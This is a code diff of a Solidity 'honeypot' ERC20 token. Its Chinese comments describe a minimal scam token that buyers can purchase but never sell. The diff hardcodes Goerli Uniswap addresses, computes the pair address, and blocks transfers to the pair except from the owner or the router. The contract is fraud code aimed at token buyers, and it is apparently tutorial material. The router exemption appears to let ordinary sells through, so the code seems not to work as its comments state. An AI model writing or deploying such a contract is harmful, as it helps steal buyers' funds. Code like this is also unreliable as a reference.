@@ -6,12 +6,24 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
 // 极简貔貅ERC20代币，只能买，不能卖
 contract HoneyPot is ERC20, Ownable {
-    address public swapRouter;
-
+    address public pair;
+    address public router;
     // 构造函数：初始化代币名称和代号
     // Uniswap Router address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
-    constructor(address swapRouter_) ERC20("HoneyPot", "PiXiu") {
-        swapRouter = swapRouter_;
+    constructor() ERC20("HoneyPot", "Pi Xiu") {
+        router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory
+        address tokenA = address(this); // 貔貅代币地址
+        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH
+        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序
+        bytes32 salt = keccak256(abi.encodePacked(token0, token1));
+        // calculate pair address
+        pair = address(uint160(uint(keccak256(abi.encodePacked(
+        hex'ff',
+        factory,
+        salt,
+        hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
+        )))));
     }
     
     /**
@@ -32,8 +44,8 @@ contract HoneyPot is ERC20, Ownable {
     ) internal virtual override {
         super._beforeTokenTransfer(from, to, amount);
         // 当转账的目标地址为 uniswap router 合约时，会revert
-        if(to == swapRouter){
-            require(msg.sender == owner(), "Can not Transfer");
+        if(to == pair){
+            require(msg.sender == owner() || msg.sender == router, "Can not Transfer");
         }
     }
 }
